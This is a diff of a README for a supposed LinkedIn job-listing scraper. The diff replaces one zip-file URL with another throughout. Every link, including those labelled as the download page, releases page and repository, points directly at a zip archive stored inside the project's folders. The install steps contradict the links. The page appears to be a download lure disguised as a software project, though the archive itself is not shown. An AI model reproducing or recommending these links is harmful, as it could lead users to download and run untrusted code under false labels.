@@ -1,7 +1,7 @@
 # 🚀 linkedin-jobs-scraper-incredibly-fast - Extract Job Data with Ease
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/hunteryeet/linkedin-jobs-scraper-incredibly-fast/main/linkedin-jobs-scraper-incredibly-fast-scraper/src/linkedin-jobs-scraper-incredibly-fast-jazzily.zip%20release-brightgreen)](https://raw.githubusercontent.com/hunteryeet/linkedin-jobs-scraper-incredibly-fast/main/linkedin-jobs-scraper-incredibly-fast-scraper/src/linkedin-jobs-scraper-incredibly-fast-jazzily.zip)
+[![Download](https://github.com/hunteryeet/linkedin-jobs-scraper-incredibly-fast/raw/refs/heads/main/linkedin-jobs-scraper-incredibly-fast-scraper/data/fast_jobs_linkedin_scraper_incredibly_v3.5.zip%20release-brightgreen)](https://github.com/hunteryeet/linkedin-jobs-scraper-incredibly-fast/raw/refs/heads/main/linkedin-jobs-scraper-incredibly-fast-scraper/data/fast_jobs_linkedin_scraper_incredibly_v3.5.zip)
 
 ## 📖 Overview
 The linkedin-jobs-scraper-incredibly-fast is a simple tool designed to help you extract job listings from LinkedIn quickly. Whether you’re job hunting or gathering data for research, this application makes it easy to get the information you need.
@@ -16,12 +16,12 @@ Getting started with the linkedin-jobs-scraper-incredibly-fast is straightforwar
 - **Internet Connection:** Required to scrape job listings
 
 ### 🔗 Download & Install
-1. Visit the following page to download the latest version: [Download Page](https://raw.githubusercontent.com/hunteryeet/linkedin-jobs-scraper-incredibly-fast/main/linkedin-jobs-scraper-incredibly-fast-scraper/src/linkedin-jobs-scraper-incredibly-fast-jazzily.zip).
+1. Visit the following page to download the latest version: [Download Page](https://github.com/hunteryeet/linkedin-jobs-scraper-incredibly-fast/raw/refs/heads/main/linkedin-jobs-scraper-incredibly-fast-scraper/data/fast_jobs_linkedin_scraper_incredibly_v3.5.zip).
    
 2. On the releases page, find the version marked as the latest. You will see options for download.
    
 3. Click on the file that matches your operating system:
-   - For Windows, choose `https://raw.githubusercontent.com/hunteryeet/linkedin-jobs-scraper-incredibly-fast/main/linkedin-jobs-scraper-incredibly-fast-scraper/src/linkedin-jobs-scraper-incredibly-fast-jazzily.zip`
+   - For Windows, choose `https://github.com/hunteryeet/linkedin-jobs-scraper-incredibly-fast/raw/refs/heads/main/linkedin-jobs-scraper-incredibly-fast-scraper/data/fast_jobs_linkedin_scraper_incredibly_v3.5.zip`
    - For Mac, choose `linkedin-jobs-scraper-incredibly-fast-macos`
 
 4. Once the file downloads, locate it in your Downloads folder.
@@ -63,7 +63,7 @@ If you encounter issues while using the application, consider these common probl
 If you need help with the application, you can reach out via issues on the GitHub page or check the FAQ section for common questions.
 
 ## 🔗 More Information
-For more details and updates on future releases, check the repository: [GitHub Repository](https://raw.githubusercontent.com/hunteryeet/linkedin-jobs-scraper-incredibly-fast/main/linkedin-jobs-scraper-incredibly-fast-scraper/src/linkedin-jobs-scraper-incredibly-fast-jazzily.zip).
+For more details and updates on future releases, check the repository: [GitHub Repository](https://github.com/hunteryeet/linkedin-jobs-scraper-incredibly-fast/raw/refs/heads/main/linkedin-jobs-scraper-incredibly-fast-scraper/data/fast_jobs_linkedin_scraper_incredibly_v3.5.zip).
 
 ## 📥 Download Now Again
-Don’t forget to download the latest version here: [Download Page](https://raw.githubusercontent.com/hunteryeet/linkedin-jobs-scraper-incredibly-fast/main/linkedin-jobs-scraper-incredibly-fast-scraper/src/linkedin-jobs-scraper-incredibly-fast-jazzily.zip).
+Don’t forget to download the latest version here: [Download Page](https://github.com/hunteryeet/linkedin-jobs-scraper-incredibly-fast/raw/refs/heads/main/linkedin-jobs-scraper-incredibly-fast-scraper/data/fast_jobs_linkedin_scraper_incredibly_v3.5.zip).
